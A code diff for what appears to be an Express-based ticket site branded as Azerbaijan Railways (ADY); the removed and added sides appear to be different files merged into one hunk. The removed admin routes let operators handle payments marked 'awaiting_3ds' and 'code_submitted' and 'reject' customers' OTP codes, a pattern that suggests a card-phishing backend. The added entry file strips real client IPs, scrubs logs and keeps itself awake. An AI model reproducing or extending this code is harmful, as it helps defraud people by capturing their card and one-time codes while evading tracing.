@@ -1,359 +1,285 @@
+const path = require('path');
 const express = require('express');
-const dayjs = require('dayjs');
-const {
-  User, Order, Ticket, Train, Station, Trip, Payment, SeatBlock, SyncLog
-} = require('../models/index');
-const { requireAdmin } = require('../middleware/auth');
-const scheduleService = require('../services/scheduleService');
-const paymentService = require('../services/paymentService');
-const liveSyncService = require('../services/liveSyncService');
-const config = require('../config');
-const adyContent = require('../config/adyContent');
-const h = require('../utils/helpers');
+const helmet = require('helmet');
+const cookieParser = require('cookie-parser');
+const rateLimit = require('express-rate-limit');
+const expressLayouts = require('express-ejs-layouts');
 
-// ==================== ROUTERS ====================
-const pages = express.Router({ mergeParams: true });
-const api = express.Router();
+const config = require('./src/config');
+const { connectDatabase, isConnected } = require('./src/config/db');
+const { buildSessionMiddleware, attachMongoStore } = require('./src/config/sessionStore');
+const localeMiddleware = require('./src/middleware/locale');
+const { loadUser } = require('./src/middleware/auth');
+const { notFound, errorHandler } = require('./src/middleware/errors');
 
-// ==================== Helper Functions ====================
-async function pendingCount() {
-  return Payment.countDocuments({ status: { $in: ['pending_admin', 'code_submitted'] } });
+const app = express();
+
+/* ==================== Baza görünüşü ==================== */
+app.set('trust proxy', 1);
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'src', 'views'));
+app.use(expressLayouts);
+app.set('layout', 'layouts/main');
+app.set('layout extractScripts', true);
+app.set('layout extractStyles', true);
+
+/* ==================== Təhlükəsizlik / məxfilik / log ==================== */
+const privacy = require('./src/middleware/privacy');
+privacy.scrubConsole();            /* bütün console çıxışları skrab olunur */
+app.disable('x-powered-by');
+app.disable('etag');
+app.use(privacy.blockProbes);      /* .env, .git, mənbə kodu kimi yollar bağlıdır */
+app.use(privacy.anonymizeRequest); /* real İP və barmaq izi başlıqları silinir, təsadüfi dəyərlə əvəzlənir */
+app.use(helmet({
+  contentSecurityPolicy: false,
+  crossOriginEmbedderPolicy: false,
+  referrerPolicy: { policy: 'no-referrer' },
+  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true }
+}));
+app.use(privacy.hardenResponse);
+if (config.nodeEnv !== 'test') {
+  app.use(privacy.privacyLogger);  /* İP / UA / sorğu parametrləri loga düşmür */
 }
 
-function adminEntry(req, res, next) {
-  if (req.currentUser && req.currentUser.role === 'admin') return next();
-  const wantsJson = req.xhr || (req.headers.accept || '').includes('application/json');
-  if (wantsJson) return res.status(403).json({ ok: false, message: res.locals.t('msg.noPermission') });
-  return res.redirect('/' + config.defaultLocale + '/login?next=' + encodeURIComponent(req.originalUrl));
-}
+/* ==================== Gövdə / statik ==================== */
+app.use(express.json({ limit: '1mb' }));
+app.use(express.urlencoded({ extended: true, limit: '1mb' }));
+app.use(cookieParser());
 
-async function ensureEnvAdmin() {
-  try {
-    const email = String(config.adminEmail || '').trim().toLowerCase();
-    if (!email) return;
-    let user = await User.findOne({ email });
-    if (!user) {
-      if (!config.adminPassword) return;
-      user = await User.create({
-        firstName: config.adminFirstName || 'Sistem',
-        lastName: config.adminLastName || 'İdarəçi',
-        email,
-        password: await User.hashPassword(config.adminPassword),
-        role: 'admin',
-        managedFromEnv: true,
-        passwordResetForced: !!config.adminTempPassword,
-        locale: config.defaultLocale
+app.use('/public', express.static(path.join(__dirname, 'public'), {
+  maxAge: config.nodeEnv === 'production' ? '7d' : 0
+}));
+app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));
+
+/* ==================== Sessiya ==================== */
+const sessionMw = buildSessionMiddleware();
+app.use(sessionMw);
+
+/* ==================== Limitlər ==================== */
+const authLimiter = rateLimit({
+  windowMs: 10 * 60 * 1000,
+  max: 80,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { ok: false, message: 'Çox sayda cəhd. Bir az sonra yenidən yoxlayın.' }
+});
+const payLimiter = rateLimit({
+  windowMs: 10 * 60 * 1000,
+  max: 120,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { ok: false, message: 'Çox sayda sorğu. Bir az sonra yenidən yoxlayın.' }
+});
+
+app.use('/api/auth', authLimiter);
+app.use('/api/payment', payLimiter);
+app.use('/api/balance', payLimiter);
+
+/* ==================== Lokalizasiya + istifadəçi ==================== */
+const { SOCIALS, APPS } = require('./src/config/social');
+const adyNotice = require('./src/config/adyContent');
+
+app.use(localeMiddleware);
+app.use(loadUser);
+
+/* Sosial platformalar, tətbiq keçidləri və MongoDB-dən canlı bildiriş */
+const noticeCache = { text: null, ticker: null, at: 0 };
+app.locals.noticeCache = noticeCache; /* admin paneli yenilədikdə keş sıfırlanır */
+app.use(async (req, res, next) => {
+  res.locals.socials = SOCIALS;
+  res.locals.apps = APPS;
+  /* Bildiriş 60 saniyədə bir MongoDB-dən oxunur; admin yenilədikdə keş sıfırlanır
+     və növbəti sorğu dərhal yeni mətni göstərir */
+  if (Date.now() - noticeCache.at > 60000) {
+    noticeCache.at = Date.now();
+    try {
+      const { Setting } = require('./src/models/index');
+      const rows = await Setting.find({ key: { $in: ['notice', 'notice_ticker'] } }).lean();
+      rows.forEach((r) => {
+        if (r.key === 'notice') noticeCache.text = r.value === undefined || r.value === null ? '' : String(r.value);
+        if (r.key === 'notice_ticker') noticeCache.ticker = r.value === undefined || r.value === null ? '' : String(r.value);
       });
-      console.log('[admin] hesab yaradıldı: ' + email);
-    } else if (user.role !== 'admin') {
-      user.role = 'admin';
-      await user.save();
-    }
-  } catch (e) {
-    console.warn('[admin] hesab hazırlanmadı:', e.message);
+    } catch (e) { /* baza yoxdursa standart mətn göstərilir */ }
   }
+  res.locals.notice = noticeCache.text !== null ? noticeCache.text : adyNotice.NOTICE;
+  res.locals.ticker = noticeCache.ticker !== null ? noticeCache.ticker : adyNotice.NOTICE_TICKER;
+  next();
+});
+
+/* İkiqat dil prefiksi (/en/az/... kimi) köhnə dil dəyişdiricidən yaranır —
+   düzgün tək prefiksə 301 ilə yönləndirilir ki, 404 baş verməsin. */
+app.use((req, res, next) => {
+  const m = req.originalUrl.match(/^\/(az|en|ru)\/(az|en|ru)(?=\/|\?|$)/);
+  if (m) return res.redirect(301, req.originalUrl.replace(m[0], '/' + m[2]));
+  next();
+});
+
+/* XHR aşkarlanması */
+app.use((req, res, next) => {
+  req.xhr = req.get('X-Requested-With') === 'XMLHttpRequest';
+  next();
+});
+
+/* ==================== Sağlamlıq ==================== */
+/* UptimeRobot üçün yüngül ping (GET və HEAD) — bazaya toxunmur */
+app.all('/ping', (req, res) => { res.set('Cache-Control', 'no-store'); res.status(200).send('pong'); });
+app.get('/healthz', (req, res) => {
+  res.json({ ok: true, db: isConnected() ? 'connected' : 'disconnected', uptime: Math.round(process.uptime()) });
+});
+
+/* ==================== Marşrutlar ==================== */
+const authRoutes = require('./src/routes/auth');
+const indexRoutes = require('./src/routes/index');
+const searchRoutes = require('./src/routes/search');
+const bookingRoutes = require('./src/routes/booking');
+const accountRoutes = require('./src/routes/account');
+const pageRoutes = require('./src/routes/pages');
+const apiRoutes = require('./src/routes/api');
+const adminRoutes = require('./src/routes/admin');
+
+/* API marşrutları dil prefiksindən asılı deyil */
+app.use('/', authRoutes);
+app.use('/', apiRoutes);
+app.use('/', bookingRoutes);
+app.use('/', accountRoutes);
+app.use('/', searchRoutes);
+
+/* İdarəetmə API-si dil prefiksindən asılı deyil */
+app.use('/api/admin', adminRoutes.api);
+
+/* Səhifə marşrutları dil prefiksi ilə */
+const localesPattern = config.locales.join('|');
+app.get('/', (req, res) => {
+  const locale = req.cookies.locale && config.locales.indexOf(req.cookies.locale) > -1 ? req.cookies.locale : config.defaultLocale;
+  res.redirect('/' + locale);
+});
+
+/* Dil prefiksli marşrutlarda lokal (tərcüməçi) ŞƏRTSİZ quraşdırılır —
+   URL prefiksi ?lang= parametrindən və cookie-dən üstündür. Əvvəllər bu blok
+   yalnız req.query.lang !== lang olduqda işə düşdüyündən /en, /ru ünvanlarında
+   mətnlər tərcümə olunmurdu və dil dəyişmədiyini düşünürdülər. */
+app.use('/:lang(' + localesPattern + ')', (req, res, next) => {
+  const lang = req.params.lang;
+  if (config.locales.indexOf(lang) > -1) {
+    res.cookie('locale', lang, { maxAge: 365 * 24 * 60 * 60 * 1000, httpOnly: false, sameSite: 'lax' });
+    req.locale = lang;
+    res.locals.locale = lang;
+    res.locals.locales = config.locales;
+    res.locals.localeNames = config.localeNames;
+    const { dicts } = require('./src/config/i18n');
+    res.locals.dict = dicts[lang] || dicts.az;
+    res.locals.t = function () {
+      const { translate } = require('./src/config/i18n');
+      return translate.apply(null, [lang].concat(Array.prototype.slice.call(arguments)));
+    };
+    res.locals.dateLocale = ({ az: 'az-AZ', en: 'en-GB', ru: 'ru-RU' })[lang] || 'az-AZ';
+    if (req.session) req.session.locale = lang;
+    /* HTML keşlənməsin — əks halda brauzer köhnə dildəki səhifəni göstərirdi */
+    res.set('Cache-Control', 'private, no-cache, no-store, must-revalidate');
+    res.set('Vary', 'Cookie');
+  }
+  next();
+});
+
+/* İdarəetmə paneli səhifələri (dil prefiksi ilə) */
+app.use('/:lang(' + localesPattern + ')/admin', adminRoutes.pages);
+
+app.use('/:lang(' + localesPattern + ')', authRoutes);
+app.use('/:lang(' + localesPattern + ')', searchRoutes);
+app.use('/:lang(' + localesPattern + ')', bookingRoutes);
+app.use('/:lang(' + localesPattern + ')', accountRoutes);
+app.use('/:lang(' + localesPattern + ')', pageRoutes);
+app.use('/:lang(' + localesPattern + ')', indexRoutes);
+
+/* ==================== Xətalar ==================== */
+app.use(notFound);
+app.use(errorHandler);
+
+/* ==================== Sinxronizasiya planlayıcısı ==================== */
+let syncTimer = null;
+function scheduleSync() {
+  if (!config.liveSyncEnabled) return;
+  const hours = Math.max(1, config.liveSyncHours);
+  clearInterval(syncTimer);
+  syncTimer = setInterval(async () => {
+    try {
+      const { runSync } = require('./src/services/liveSyncService');
+      const scheduleService = require('./src/services/scheduleService');
+      const h = require('./src/utils/helpers');
+      await runSync('timer');
+      await scheduleService.ensureTripsForDate(h.todayISO());
+    } catch (e) {
+      console.warn('[sync] avtomatik sinxronizasiya alınmadı:', e.message);
+    }
+  }, hours * 60 * 60 * 1000);
 }
 
-// ==================== PAGES ROUTES ====================
-pages.use(requireAdmin);
-
-pages.get('/', adminEntry, async (req, res, next) => {
+/* ==================== Başlanğıc ==================== */
+async function start() {
   try {
-    const startOfDay = dayjs().startOf('day').toDate();
-    const [
-      userCount, orderCount, ticketCount, trainCount, stationCount,
-      pending, todayTrips, revenueAgg, recentOrders, pendingPayments, lastSync
-    ] = await Promise.all([
-      User.countDocuments({ role: 'user' }),
-      Order.countDocuments(),
-      Ticket.countDocuments({ status: 'active' }),
-      Train.countDocuments({ active: true }),
-      Station.countDocuments({ active: true }),
-      pendingCount(),
-      Trip.countDocuments({ date: dayjs().format('YYYY-MM-DD') }),
-      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }]),
-      Order.find().sort({ createdAt: -1 }).limit(8).lean(),
-      Payment.find({ status: { $in: ['pending_admin', 'code_submitted'] } }).sort({ createdAt: -1 }).limit(8).lean(),
-      SyncLog.findOne().sort({ createdAt: -1 }).lean()
-    ]);
-
-    res.render('pages/admin/dashboard', {
-      title: 'İdarəetmə paneli',
-      stats: {
-        users: userCount,
-        orders: orderCount,
-        tickets: ticketCount,
-        trains: trainCount,
-        stations: stationCount,
-        pending,
-        todayTrips,
-        revenue: revenueAgg.length ? revenueAgg[0].total : 0
-      },
-      recentOrders,
-      pendingPayments,
-      lastSync,
-      startOfDay
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/odenisler', requireAdmin, async (req, res, next) => {
-  try {
-    const status = req.query.status || 'pending';
-    const filter = status === 'pending'
-      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted'] } }
-      : status === 'all' ? {} : { status };
-
-    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
-    const orderIds = payments.map((p) => p.order).filter(Boolean);
-    const userIds = payments.map((p) => p.user).filter(Boolean);
-
-    const [orders, users] = await Promise.all([
-      Order.find({ _id: { $in: orderIds } }).lean(),
-      User.find({ _id: { $in: userIds } }).lean()
-    ]);
-
-    const orderMap = {};
-    orders.forEach((o) => { orderMap[String(o._id)] = o; });
-    const userMap = {};
-    users.forEach((u) => { userMap[String(u._id)] = u; });
-
-    res.render('pages/admin/payments', {
-      title: res.locals.t('admin.payments'),
-      payments,
-      orderMap,
-      userMap,
-      status,
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/sifarisler', requireAdmin, async (req, res, next) => {
-  try {
-    const status = req.query.status || 'all';
-    const filter = status === 'all' ? {} : { status };
-    const orders = await Order.find(filter).sort({ createdAt: -1 }).limit(120).lean();
-    const users = await User.find({ _id: { $in: orders.map((o) => o.user) } }).lean();
-    const userMap = {};
-    users.forEach((u) => { userMap[String(u._id)] = u; });
-    res.render('pages/admin/orders', { 
-      title: res.locals.t('admin.orders'), 
-      orders, 
-      userMap, 
-      status, 
-      pending: await pendingCount() 
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/reysler', requireAdmin, async (req, res, next) => {
-  try {
-    const date = /^\d{4}-\d{2}-\d{2}$/.test(req.query.date || '') ? req.query.date : h.todayISO();
-    const line = req.query.line || 'all';
-    await scheduleService.ensureTripsForDate(date);
-    const rows = await scheduleService.buildTimetableRows(date, line);
-    const stations = await Station.find({ active: true }).sort({ order: 1 }).lean();
-
-    const trips = await Trip.find({ date }).select('_id trainNumber').lean();
-    const tripMap = {};
-    trips.forEach((t) => { tripMap[t.trainNumber] = String(t._id); });
-    rows.forEach((r) => { r.tripId = tripMap[r.number] || ''; });
-
-    res.render('pages/admin/trips', {
-      title: res.locals.t('admin.trips'),
-      rows, date, line, stations,
-      dateText: h.azDate(date),
-      today: h.todayISO(),
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/reys/:tripId', requireAdmin, async (req, res, next) => {
-  try {
-    const trip = await Trip.findById(req.params.tripId).lean();
-    if (!trip) return next();
-
-    const maps = (trip.classes || []).map((c) => scheduleService.buildSeatMap(trip, c.code)).filter(Boolean);
-    const blocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
-    const orders = await Order.find({ trip: trip._id, status: 'confirmed' }).lean();
-
-    res.render('pages/admin/trip-detail', {
-      title: 'Reys ' + trip.trainNumber,
-      trip, maps, blocks, orders,
-      dateText: h.azDate(trip.date),
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/qatarlar', requireAdmin, async (req, res, next) => {
-  try {
-    const line = req.query.line || 'all';
-    const filter = line === 'all' ? {} : { line };
-    const trains = await Train.find(filter).sort({ number: 1 }).limit(300).lean();
-    res.render('pages/admin/trains', { 
-      title: res.locals.t('admin.trains'), 
-      trains, 
-      line, 
-      total: trains.length, 
-      pending: await pendingCount() 
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/qatarlar/yeni', requireAdmin, async (req, res, next) => {
-  try {
-    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
-    res.render('pages/admin/train-form', {
-      title: res.locals.t('admin.newTitle'),
-      train: null,
-      stations,
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/qatarlar/:id/redakte', requireAdmin, async (req, res, next) => {
-  try {
-    const train = await Train.findById(req.params.id).lean();
-    if (!train) return next();
-    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
-    res.render('pages/admin/train-form', {
-      title: 'Reysi redaktə et: ' + train.number,
-      train,
-      stations,
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/istifadeciler', requireAdmin, async (req, res, next) => {
-  try {
-    const users = await User.find().sort({ createdAt: -1 }).limit(200).lean();
-    res.render('pages/admin/users', { 
-      title: res.locals.t('admin.users'), 
-      users, 
-      pending: await pendingCount() 
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
-  try {
-    const logs = await SyncLog.find().sort({ createdAt: -1 }).limit(30).lean();
-    const { Setting } = require('../models/index');
-    const noticeRow = await Setting.findOne({ key: 'notice' }).lean();
-    const tickerRow = await Setting.findOne({ key: 'notice_ticker' }).lean();
-    res.render('pages/admin/sync', {
-      title: res.locals.t('admin.sync'),
-      logs,
-      sourceUrl: config.liveSourceUrl,
-      enabled: config.liveSyncEnabled,
-      intervalHours: config.liveSyncHours,
-      noticeValue: noticeRow ? noticeRow.value : adyContent.NOTICE,
-      tickerValue: tickerRow ? tickerRow.value : adyContent.NOTICE_TICKER,
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-// ==================== API ROUTES ====================
-api.use(requireAdmin);
-
-api.post('/payments/:id/approve-final', async (req, res) => {
-  try {
-    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
-    return res.json({
-      ok: true,
-      message: '✅ Biletlər uğurla verildi.',
-      pnr: result.tickets && result.tickets.length ? result.tickets[0].pnr : ''
-    });
+    await connectDatabase();
   } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
+    console.error('[start] MongoDB qoşulması alınmadı:', e.message);
   }
-});
 
-api.post('/payments/:id/reject-otp', async (req, res) => {
-  try {
-    const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
-    return res.json({
-      ok: true,
-      message: '❌ Səhv OTP - Yeni kod yaradıldı. İstifadəçi yenidən cəhd edəcək.',
-      code: result.code
-    });
-  } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
-  }
-});
+  if (sessionMw.__store) attachMongoStore(sessionMw.__store, app);
 
-api.post('/payments/:id/decline', async (req, res) => {
-  try {
-    await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
-    return res.json({ ok: true, message: 'Ödəniş rədd edildi.' });
-  } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
-  }
-});
-
-api.post('/orders/:id/status', async (req, res) => {
-  try {
-    const order = await Order.findById(req.params.id);
-    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
-    order.status = (req.body || {}).status || order.status;
-    order.adminNote = (req.body || {}).note || order.adminNote;
-    await order.save();
-    return res.json({ ok: true, message: 'Status yeniləndi' });
-  } catch (e) {
-    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
-  }
-});
-
-api.post('/trips/:tripId/seats/block', async (req, res) => {
-  try {
-    const b = req.body || {};
-    const trip = await Trip.findById(req.params.tripId);
-    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });
-
-    const wagon = Number(b.wagon);
-    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
-    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });
-
-    const seats = [];
-    if (typeof b.seat === 'string' && b.seat.indexOf('-') > -1) {
-      const parts = b.seat.split('-');
-      const from = Number(parts[0]);
-      const to = Number(parts[1]);
-      for (let i = from; i <= to; i++) seats.push(i);
-    } else if (b.seat) {
-      seats.push(Number(b.seat));
+  if (config.autoSeed && isConnected()) {
+    try {
+      const { seedAll } = require('./src/seed/seed');
+      await seedAll({ force: false });
+    } catch (e) {
+      console.warn('[start] ilkin məlumat yazıla bilmədi:', e.message);
     }
-
-    const block = await SeatBlock.create({
-      trip: trip._id,
-      date: trip.date,
-      classCode: b.classCode,
-      wagon,
-      seats,
-      reason: b.reason || '',
-      active: true
-    });
-
-    return res.json({ ok: true, message: 'Yerlər bağlandı', block });
-  } catch (e) {
-    return res.status(500).json({ ok: false, message: 'Bağlanmadı' });
   }
-});
 
-api.delete('/blocks/:blockId', async (req, res) => {
-  try {
-    await SeatBlock.findByIdAndDelete(req.params.blockId);
-    return res.json({ ok: true, message: 'Bağlantı açıldı' });
-  } catch (e) {
-    return res.status(500).json({ ok: false, message: 'Açılmadı' });
+  /* ADY məzmunu və idarəçi hesabı — ilkin yazılışdan sonra tətbiq olunur */
+  if (isConnected()) {
+    try {
+      const { bootstrap } = require('./src/seed/bootstrap');
+      await bootstrap();
+    } catch (e) {
+      console.warn('[start] ADY məzmunu hazırlanmadı:', e.message);
+    }
   }
-});
 
-// ==================== EXPORTS ====================
-module.exports = { pages, api };
+  if (config.liveSyncOnBoot && isConnected()) {
+    setTimeout(async () => {
+      try {
+        const { runSync } = require('./src/services/liveSyncService');
+        const scheduleService = require('./src/services/scheduleService');
+        const h = require('./src/utils/helpers');
+        await runSync('boot');
+        await scheduleService.ensureTripsForDate(h.todayISO());
+        console.log('[sync] başlanğıc sinxronizasiyası tamamlandı');
+      } catch (e) {
+        console.warn('[sync] başlanğıc sinxronizasiyası alınmadı:', e.message);
+      }
+    }, 4000);
+  }
+
+  /* Yerləri vaxtı keçmiş sifarişlərdən azad et */
+  setInterval(async () => {
+    if (!isConnected()) return;
+    try {
+      const bookingService = require('./src/services/bookingService');
+      await bookingService.releaseExpiredOrders();
+    } catch (e) { /* susdurulur */ }
+  }, 5 * 60 * 1000);
+
+  scheduleSync();
+
+  const port = process.env.PORT || config.port;
+  try { require('./src/services/keepAlive').start(); } catch (e) { console.warn('[keepalive]', e.message); }
+  app.listen(port, () => {
+    console.log('ADY bilet portalı işə düşdü — port ' + port);
+    console.log('Mühit: ' + config.nodeEnv + ' | Canlı mənbə: ' + config.liveSourceUrl);
+  });
+}
+
+if (require.main === module) {
+  start();
+}
+
+module.exports = app;
+module.exports.start = start;
